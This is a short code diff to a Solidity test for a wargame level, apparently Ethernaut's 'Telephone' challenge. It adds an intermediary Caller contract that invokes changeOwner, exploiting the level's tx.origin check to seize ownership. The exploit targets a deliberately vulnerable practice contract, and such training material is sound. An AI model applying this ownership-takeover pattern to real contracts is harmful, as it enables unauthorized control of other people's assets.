@@ -5,11 +5,17 @@ import {BaseTest} from "./BaseTest.sol";
 import {TelephoneFactory} from "../src/levels/04-TelephoneFactory.sol";
 import {Telephone} from "../src/levels/04-Telephone.sol";
 
+contract Caller {
+    function dial(Telephone telephone) external {
+        telephone.changeOwner(msg.sender);
+    }
+}
+
 contract TelephoneSolution is BaseTest {
 
     function solution(address payable target_) internal override{
         Telephone target = Telephone(target_);
-        target.changeOwner(attacker);
+        (new Caller()).dial(target);
     }
 
     function construction() internal override returns(address payable ) {
